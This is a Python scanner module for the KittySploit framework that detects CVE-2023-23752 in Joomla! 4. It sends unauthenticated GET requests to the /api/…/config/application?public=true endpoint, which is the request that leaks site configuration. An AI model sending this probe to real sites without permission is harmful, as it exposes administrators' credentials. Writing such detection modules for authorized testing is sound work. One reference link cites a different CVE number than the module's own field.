#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An issue was discovered in Joomla! 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla! Webservice - Password Disclosure Detection',
        'description': 'An issue was discovered in Joomla! 4.0.0 through 4.2.7. An improper access check allows unauthorized access to webservice endpoints.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'modules': [
            'auxiliary/scanner/http/joomla_scanner',
        ],
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'joomla', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://unsafe.sh/go-149780.html',
            'https://twitter.com/gov_hack/status/1626471960141238272/photo/1',
            'https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-23552',
            'https://github.com/20142995/pocsuite3',
        ],
        'cve': 'CVE-2023-23752',
    }

    def run(self):
        for path in ('/api/index.php/v1/config/application?public=true', '/api/v1/config/application?public=true'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('"links":', '"attributes":',)
            header_any = ('application/json', 'application/vnd.api+json',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="Joomla! Webservice - Password Disclosure detected",
                    path=path,
                )
                return True
        return False

